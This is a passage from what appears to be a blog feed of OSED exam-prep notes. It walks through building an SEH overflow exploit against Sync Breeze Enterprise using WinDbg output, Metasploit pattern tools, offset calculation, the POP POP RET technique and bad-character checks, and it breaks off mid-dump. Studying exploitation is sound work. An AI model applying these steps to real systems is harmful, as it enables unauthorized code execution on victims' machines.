</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>d <span style="color:#ae81ff">8</span>bec            mov     ebp,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622f</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316232</span> <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316233</span> <span style="color:#ae81ff">64ff</span><span style="color:#ae81ff">3500000000</span>  push    dword ptr fs:[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731623</span>a <span style="color:#ae81ff">64892500000000</span>  mov     dword ptr fs:[<span style="color:#ae81ff">0</span>],esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316241</span> ff7514          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316244</span> ff7510          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316247</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch] <span style="color:#75715e">// This is the EstablisherFrame address 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">7731624</span>a ff7508          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>d <span style="color:#ae81ff">8</span>b4d18          mov     ecx,dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx <span style="color:#75715e">// This ends calling 0x41414141, our handler function! 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">77316252</span> <span style="color:#ae81ff">648</span>b2500000000  mov     esp,dword ptr fs:[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316259</span> <span style="color:#ae81ff">648f</span><span style="color:#ae81ff">0500000000</span>  pop     dword ptr fs:[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316260</span> <span style="color:#ae81ff">8</span>be5            mov     esp,ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316262</span> <span style="color:#ae81ff">5</span>d              pop     ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316263</span> c21400          ret     <span style="color:#ae81ff">14</span>h
</span></span></code></pre></div><p>Indeed, if we inspect that address, we will find that is is the location of our shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77316247</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316247</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]  ss:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">46</span>c<span style="color:#f92672">=</span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
</span></span></code></pre></div><p>Let&rsquo;s see the contents of ebp+0ch:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dds ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">46</span>c  <span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
</span></span></code></pre></div><p>We can see that the address of our <code>_EXCEPTION_REGISTRATION_RECORD</code> is there. The other parameters are also EBP offsets, but we are not interested.</p>
<p>Once that we know that such address is the one we want to redirect the execution flow, we could overwrite the exception handler with the address of an instruction that returns into the <strong>EstablisherFrame</strong> address on the stack, so that our code is executed.
The most common sequence of instructions used in SEH overflows to accomplish this task is <strong>“POP R32, POP R32, RET”,</strong> in which we POP the return address and the ExceptionRecord argument from the stack into two arbitrary registers (R32) and then execute a RET operation to return into the EstablisherFrame. This is because we pushed the last argument, before the &ldquo;call ecx&rdquo; instruction. The call instruction pushes in the stack the return address, so would have to pop the return address and the last argument to have the EstablisherFrame address in the top of the stack, so we can perform a <code>ret</code> to this address and redirect the flow.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_seh_2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_seh_2/</guid>
      <description><![CDATA[<h1 id="our-first-seh-overflow-exploit-step-by-step">Our first SEH overflow exploit, step by step</h1>
<p>Let&rsquo;s start supposing that we already know that our input buffer crashes the program and somehow reaches any of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structures.
Let&rsquo;s create a pattern in KALI to see the length of our buffer until it reaches the structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_create -l <span style="color:#ae81ff">1000</span>              
</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</span></span></code></pre></div><p>Let&rsquo;s paste this pattern and send this next to the headers needed so our payload is processed. Sending only this payload is useless as we want the program to process the input.
With 1000 characters, the program crashes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#ae81ff">1794.19f</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libpal.dll
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">63413163</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>affa0c ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>afff08 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>aff9c4 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>afff08 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>affb10
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">932</span>a9d esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>aff998 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span>affeb8 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010206</span>
</span></span><span style="display:flex;"><span>libpal<span style="color:#f92672">!</span>SCA_ConfigObj<span style="color:#f92672">::</span>Deserialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">932</span>a9d ff5024          call    dword ptr [eax<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>h]  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">63413187</span><span style="color:#f92672">=????????</span>
</span></span></code></pre></div><p>We need to see at what address does our <code>EXCEPTION_REGISTRATION_RECORD</code> structures point to.
Let&rsquo;s list the exception chains:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>exchain
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>affe0c: libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">149f</span>b (<span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span>adf5b)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>afff44: <span style="color:#ae81ff">33654132</span>
</span></span><span style="display:flex;"><span>Invalid exception stack at <span style="color:#ae81ff">65413165</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">00366000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">00</span>affe0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">00</span>b00000
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">00</span>aff000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">00366000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000017</span><span style="color:#ae81ff">94</span> . <span style="color:#ae81ff">000019f</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">005</span><span style="color:#ae81ff">87898</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00354000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>affe0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00afff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x009adf5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>afff44
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x65413165</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x33654132</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">33654132</span>
</span></span></code></pre></div><p>We can see that the second record generated an error:</p>
<ul>
<li>The &ldquo;Next&rdquo; pointer points to an invalid address (65413165), which gives an invalid exception stack error.</li>
<li>The Handler is also overwritten as it is placed after the &ldquo;Next&rdquo; parameter in the stack.
Let&rsquo;s verify that both values have been overwritten with our buffer:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">1000</span> -q <span style="color:#ae81ff">33654132</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">128</span>
</span></span><span style="display:flex;"><span>                                                                                                                                                     
</span></span><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">1000</span> -q 0x65413165 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">124</span>
</span></span></code></pre></div><p>We can see that we managed to overwrite both values.
So our payload is 128 bytes (in order to overwrite both values).
Let&rsquo;s put 124 &ldquo;A&rdquo;, 4 &ldquo;B&rdquo; (which will overwrite the Next value) and another 4 &ldquo;C&rdquo; (which will overwrite the Handler value).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">82000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0185f</span>e14
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01</span><span style="color:#ae81ff">860000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0185f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">82000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00001</span>b28 . <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">828</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">005f</span>a6d8
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00376000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0185f</span>e14
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0185ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0096dce3</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0185ff</span><span style="color:#ae81ff">44</span> 
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x42424242</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x43434343</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>As we can see, we managed to overwrite both values.
We want to overwrite only the &ldquo;Handler&rdquo; value so we will add 128 bytes (the next 4 will overwrite the handle address).</p>
<p>Let&rsquo;s continue by deleting the bad characters.
Update the payload to add the badchars after the 128 bytes.
Also, let&rsquo;s add more bytes so the overflow is triggered (<strong>At this point I don&rsquo;t know why, but, when adding the badchars after the 128 bytes that previously crashed the binary, it does not crash anymore. I guess it&rsquo;s because of the badchars. We have to add more bytes AFTER the badchars so it crashes and we can inspect badchars</strong>)
Once we have updated the payload, we have to inspect the part of the stack where our payload is stored.
If we remember, the same location where the <code>EXCEPTION_REGISTRATION_RECORD</code> pointed to is where the payload is stored. Let&rsquo;s check:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">00224000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0171f</span>e0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01720000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0171f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">00224000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000630</span> . <span style="color:#ae81ff">00000</span>ce4
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0062</span><span style="color:#ae81ff">9628</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0021</span><span style="color:#ae81ff">9000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0171f</span>e0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0171ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0089df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Let&rsquo;s access the address of such record which is fully overwritten:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0x0171ff44</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">42424242</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">00</span><span style="color:#ae81ff">8507</span>ec libpal<span style="color:#f92672">!</span>SCA_TcpServer<span style="color:#f92672">::</span>CommandCallback<span style="color:#f92672">+</span><span style="color:#ae81ff">0xdc</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">00853e10</span> libpal<span style="color:#f92672">!</span>SCA_WinFile<span style="color:#f92672">::</span>operator<span style="color:#f92672">=+</span><span style="color:#ae81ff">0xe50</span>
</span></span></code></pre></div><p>After the payload we se a &ldquo;0000001&rdquo; value, let&rsquo;s inspect what happened:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">0x0171ff44</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> ec <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span>  AAAABBBB........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">72</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span> c0 ed bc <span style="color:#ae81ff">00</span>  .<span style="color:#f92672">&gt;</span>..._..r<span style="color:#960050;background-color:#1e0010">@</span>......
